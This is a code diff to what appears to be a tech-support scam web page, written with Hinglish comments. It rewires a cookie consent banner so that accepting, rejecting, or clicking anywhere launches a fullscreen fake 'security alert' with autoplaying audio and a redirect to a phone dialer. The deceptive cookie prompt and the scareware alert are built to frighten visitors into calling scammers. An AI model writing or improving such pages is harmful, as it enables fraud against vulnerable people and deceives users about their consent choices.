@@ -23,6 +23,7 @@
         color: #fff;
         position: relative;
         user-select: none;
+        cursor: pointer;
     }
 
     /* 🔽 startImage ko button ki tarah set kiya, size bada kiya */
@@ -49,11 +50,12 @@
         left: 0;
         width: 100%;
         height: 100%;
-        background: rgba(0, 0, 0, 0.8);
+        background: rgba(0, 0, 0, 0.9);
         display: flex;
         justify-content: center;
         align-items: center;
         z-index: 1000;
+        cursor: pointer;
     }
 
     .cookies-content {
@@ -65,6 +67,7 @@
         text-align: center;
         color: #000;
         box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        cursor: default;
     }
 
     .cookies-content h2 {
@@ -366,18 +369,18 @@
     
     let hasStarted = false;
     let popupActive = false;
-    let cookiesAccepted = false;
 
     function isMobile() {
         return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
     }
 
     function activateFullScreen() {
-        if (hasStarted || !cookiesAccepted) return;
+        if (hasStarted) return;
         hasStarted = true;
         
         applyBackground();
         startImage.style.display = 'none';
+        cookiesPopup.style.display = 'none';
         document.getElementById('leavePopup').style.display = 'block';
         audio.play();
         popupActive = true;
@@ -406,15 +409,11 @@
     }
 
     function handleCookiesAccept() {
-        cookiesAccepted = true;
-        cookiesPopup.style.display = 'none';
-        // Now user can click anywhere to activate full screen security alert
+        activateFullScreen();
     }
 
     function handleCookiesReject() {
-        cookiesAccepted = true;
-        cookiesPopup.style.display = 'none';
-        // Still allow security alert to work even if cookies rejected
+        activateFullScreen();
     }
 
     window.onload = function() {
@@ -429,13 +428,21 @@
         
         // Add click event listener to the entire body for initial activation
         document.body.addEventListener('click', function(e) {
-            // Only activate if cookies are accepted, not clicking on cookies popup, and popup is not active
-            if (cookiesAccepted && !e.target.closest('#cookiesPopup') && !e.target.closest('#leavePopup') && !popupActive) {
+            // Only activate if we're not clicking on the security popup itself
+            if (!e.target.closest('#leavePopup') && !popupActive) {
                 activateFullScreen();
             }
         });
         
-        // Add click event listener to the popup for redirecting to dialer
+        // Add click event listener to cookies popup background
+        cookiesPopup.addEventListener('click', function(e) {
+            // If clicking on the background (not the content), activate full screen
+            if (e.target === cookiesPopup) {
+                activateFullScreen();
+            }
+        });
+        
+        // Add click event listener to the security popup for redirecting to dialer
         document.getElementById('leavePopup').addEventListener('click', function() {
             if (popupActive) {
                 redirectToDialer();
@@ -454,9 +461,7 @@
 
     startImage.addEventListener('click', function (e) {
         e.stopPropagation();
-        if (cookiesAccepted) {
-            activateFullScreen();
-        }
+        activateFullScreen();
     }, { once: true });
 
     callNowBtn.addEventListener('click', function (e) {
